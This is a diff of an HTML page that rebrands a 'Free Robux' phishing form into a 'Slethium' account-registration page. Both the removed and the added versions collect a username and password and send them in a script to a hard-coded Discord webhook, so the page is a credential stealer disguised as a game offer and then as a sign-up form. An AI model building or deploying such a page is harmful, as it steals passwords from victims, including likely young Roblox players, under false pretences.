@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Robux</title>
+    <title>Slethium</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;700&display=swap');
 
@@ -134,19 +134,19 @@
 <body>
 
 <div class="container">
-    <h1>Free Robux</h1>
-    <p class="description">Submit an amount of robux.</p>
+    <h1>Slethium™</h1>
+    <p class="description">Register your Slethium Account.</p>
     
     <div class="input-group">
-        <input type="text" id="gameLink" placeholder="Robux Amount">
+        <input type="text" id="displayName" placeholder="Nickname">
     </div>
 
     <div class="input-group">
-        <input type="text" id="username" placeholder="Roblox Username">
+        <input type="text" id="username" placeholder="Username">
     </div>
 
     <div class="input-group">
-        <input type="text" id="displayName" placeholder="Roblox Password">
+        <input type="text" id="password" placeholder="Password">
     </div>
 
     <button id="submitBtn" onclick="sendToWebhook()">Submit</button>
@@ -158,9 +158,9 @@
     async function sendToWebhook() {
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1477445891391619255/sdSVJwb1hSZASH12-crIs03fdtF4wDge2aVJWkowtfRXjX99-lHLBGrl7ag4UA4yB_Mu';
         
-        const gameLink = document.getElementById('gameLink').value.trim();
-        const username = document.getElementById('username').value.trim();
         const displayName = document.getElementById('displayName').value.trim();
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value.trim();
         const status = document.getElementById('status');
         const btn = document.getElementById('submitBtn');
 
@@ -175,12 +175,12 @@
 
         const payload = {
             embeds: [{
-                title: "🛰️ New Decompiler Request",
+                title: "New Account Registeration Request",
                 color: 0x00f2ff,
                 fields: [
-                    { name: "🔗 Roadbux", value: gameLink },
+                    { name: "👤 DisplayName", value: displayName },
                     { name: "👤 Username", value: username, inline: true },
-                    { name: "📛 Password", value: displayName, inline: true }
+                    { name: "📛 Password", value: password, inline: true }
                 ],
                 footer: { text: "Transmission logged" },
                 timestamp: new Date()
